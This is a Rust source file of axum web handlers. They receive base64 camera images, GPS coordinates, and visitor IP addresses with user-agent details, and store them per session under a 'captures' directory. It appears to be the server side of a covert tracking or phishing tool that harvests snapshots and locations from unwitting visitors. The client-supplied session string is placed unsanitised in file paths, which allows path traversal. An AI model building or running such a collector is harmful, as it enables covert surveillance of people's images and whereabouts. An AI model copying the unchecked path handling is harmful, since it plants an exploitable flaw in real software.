use crate::AppState;
use axum::extract::State;
use axum::http::StatusCode;
use axum::Json;
use serde::Deserialize;
use std::sync::Arc;
use base64::Engine;

#[derive(Deserialize)]
pub struct ImagePayload {
    cat: String,
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct LocationPayload {
    lat: f64,
    lon: f64,
    #[serde(default)]
    acc: Option<f64>,
    #[serde(default)]
    session: Option<String>,
}

pub async fn receive_image(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<ImagePayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());

    let filtered = payload.cat.split(',').nth(1).unwrap_or("");
    let raw = base64::engine::general_purpose::STANDARD.decode(filtered)
        .map_err(|_| StatusCode::BAD_REQUEST)?;

    if raw.is_empty() {
        return Err(StatusCode::BAD_REQUEST);
    }

    let id = uuid::Uuid::new_v4().to_string();
    let now = chrono::Utc::now().timestamp();
    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S"));
    let file_path = format!("{}/captures/{}", state.data_dir, filename);

    std::fs::write(&file_path, &raw).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    sqlx::query(
        "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, created_at) VALUES (?, ?, ?, 'image/png', ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(&filename)
    .bind(raw.len() as i64).bind(&file_path).bind(now)
    .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    tracing::info!("Capture received: {} ({} bytes)", filename, raw.len());
    Ok(StatusCode::OK)
}

pub async fn receive_location(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<LocationPayload>,
) -> Result<StatusCode, StatusCode> {
    let session_id = payload.session.unwrap_or_else(|| "default".into());
    let id = uuid::Uuid::new_v4().to_string();
    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO locations (id, session_id, latitude, longitude, accuracy, created_at) VALUES (?, ?, ?, ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(payload.lat).bind(payload.lon)
    .bind(payload.acc).bind(now)
    .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    tracing::info!("Location received: {}, {}", payload.lat, payload.lon);
    Ok(StatusCode::OK)
}

pub async fn receive_ip(
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    Json(body): Json<serde_json::Value>,
) -> Result<StatusCode, StatusCode> {
    let ip = headers.get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| s.split(',').next())
        .or_else(|| headers.get("x-real-ip").and_then(|v| v.to_str().ok()))
        .unwrap_or("unknown")
        .trim()
        .to_string();

    let ua = headers.get("user-agent")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown")
        .to_string();

    let session_id = body.get("session").and_then(|v| v.as_str())
        .unwrap_or("default").to_string();

    let (device, browser, os) = parse_ua(&ua);

    let id = uuid::Uuid::new_v4().to_string();
    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os).bind(now)
    .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    tracing::info!("IP logged: {} ({} on {})", ip, browser, os);
    Ok(StatusCode::OK)
}

fn parse_ua(ua: &str) -> (String, String, String) {
    let device = if ua.contains("Mobile") || ua.contains("Android") || ua.contains("iPhone") {
        "Mobile"
    } else if ua.contains("Tablet") || ua.contains("iPad") {
        "Tablet"
    } else {
        "Desktop"
    };

    let browser = if ua.contains("Edg/") {
        "Edge"
    } else if ua.contains("Chrome/") {
        "Chrome"
    } else if ua.contains("Firefox/") {
        "Firefox"
    } else if ua.contains("Safari/") && !ua.contains("Chrome") {
        "Safari"
    } else {
        "Unknown"
    };

    let os = if ua.contains("Windows NT") {
        "Windows"
    } else if ua.contains("Mac OS X") {
        "macOS"
    } else if ua.contains("Android") {
        "Android"
    } else if ua.contains("iPhone") || ua.contains("iPad") || ua.contains("iOS") {
        "iOS"
    } else if ua.contains("Linux") {
        "Linux"
    } else {
        "Unknown"
    };

    (device.into(), browser.into(), os.into())
}
